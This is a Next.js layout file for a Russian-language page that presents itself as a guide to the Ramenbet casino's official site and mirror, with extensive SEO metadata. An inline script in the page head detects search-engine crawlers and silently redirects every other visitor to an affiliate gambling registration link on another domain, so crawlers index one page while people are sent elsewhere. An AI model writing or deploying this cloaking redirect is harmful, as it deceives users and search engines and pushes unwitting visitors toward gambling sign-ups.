import type { Metadata, Viewport } from 'next'
import { Manrope, Unbounded } from 'next/font/google'
import './globals.css'
import './nk8r.css'

const nk8rBody = Manrope({
  subsets: ['latin', 'cyrillic'],
  variable: '--font-nk8r-body',
  display: 'swap',
})

const nk8rDisplay = Unbounded({
  subsets: ['latin', 'cyrillic'],
  weight: ['500', '700'],
  variable: '--font-nk8r-display',
  display: 'swap',
})

const SITE = 'https://ramenbet21casino.vercel.app'
const TITLE =
  'Ramenbet казино: официальный сайт, рабочее зеркало и понятный гид для игрока 18+'
const DESCRIPTION =
  'Короткий гид по Ramenbet: официальный сайт, рабочее зеркало и Ramenbet казино для обычного игрока. Сверьте Ramen bet и Рамен бет, проверьте адрес и не вводите пароль на похожей чужой копии в этот раз.'

export const metadata: Metadata = {
  metadataBase: new URL(SITE),
  title: TITLE,
  description: DESCRIPTION,
  keywords: [
    'Ramenbet',
    'Ramenbet зеркало',
    'Рамен бет',
    'Ramen bet',
    'Ramenbet официальный сайт',
    'Ramenbet рабочее зеркало',
    'Ramenbet казино',
  ],
  alternates: {
    canonical: `${SITE}/`,
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      'max-image-preview': 'large',
      'max-snippet': -1,
      'max-video-preview': -1,
    },
  },
  openGraph: {
    title: TITLE,
    description: DESCRIPTION,
    url: `${SITE}/`,
    siteName: 'Ramenbet',
    locale: 'ru_RU',
    type: 'website',
    images: [
      {
        url: '/nk8r-hero.jpg',
        width: 1200,
        height: 805,
        alt: 'Миска рамена на ночном прилавке',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: TITLE,
    description: DESCRIPTION,
    images: ['/nk8r-hero.jpg'],
  },
  icons: {
    icon: [{ url: '/favicon.png', type: 'image/png' }],
    apple: '/apple-icon.png',
  },
}

export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  themeColor: '#1b2430',
  colorScheme: 'dark',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${nk8rBody.variable} ${nk8rDisplay.variable} bg-background`}>
      <head>
        <meta name="yandex-verification" content="81ac74290031719a" />
        <title>{TITLE}</title>
        <meta name="description" content={DESCRIPTION} />
        <meta
          name="keywords"
          content="Ramenbet, Ramenbet зеркало, Рамен бет, Ramen bet, Ramenbet официальный сайт, Ramenbet рабочее зеркало, Ramenbet казино"
        />
        <link rel="canonical" href="https://ramenbet21casino.vercel.app/" />
        <meta name="robots" content="index, follow, max-image-preview:large" />
        <meta name="theme-color" content="#1b2430" />
        <meta name="author" content="Ramenbet" />
        <meta property="og:type" content="website" />
        <meta property="og:locale" content="ru_RU" />
        <meta property="og:site_name" content="Ramenbet" />
        <meta property="og:title" content={TITLE} />
        <meta property="og:description" content={DESCRIPTION} />
        <meta property="og:url" content="https://ramenbet21casino.vercel.app/" />
        <meta property="og:image" content="https://ramenbet21casino.vercel.app/nk8r-hero.jpg" />
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content={TITLE} />
        <meta name="twitter:description" content={DESCRIPTION} />
        <link rel="icon" href="/favicon.png" type="image/png" />
        <link rel="apple-touch-icon" href="/apple-icon.png" />
        {/* дополнительные пользовательские теги */}
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://1579.sparksvale.com/ru/registration?partner=p1579p39210pfe27");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="font-sans antialiased">{children}</body>
    </html>
  )
}
